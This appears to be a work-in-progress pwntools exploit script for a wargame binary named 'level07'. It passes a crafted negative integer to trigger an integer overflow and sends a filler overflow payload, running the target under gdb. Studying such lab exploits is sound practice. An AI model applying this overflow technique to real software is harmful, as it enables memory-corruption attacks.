from pwn import *

elf = ELF('./level07')


# for off in range(0, 100):
#     print(off)
payload = [
     (0xf0 // 4)* p32(0x574f4c46),
]

payload = b"".join(payload)

arg1 = (-2 ** 31) + 60

print(arg1)

arg2 = payload

p = gdb.debug(exe='level07', args=['level07', str(arg1), arg2], gdbscript='''
b main
continue
''')
p.interactive()


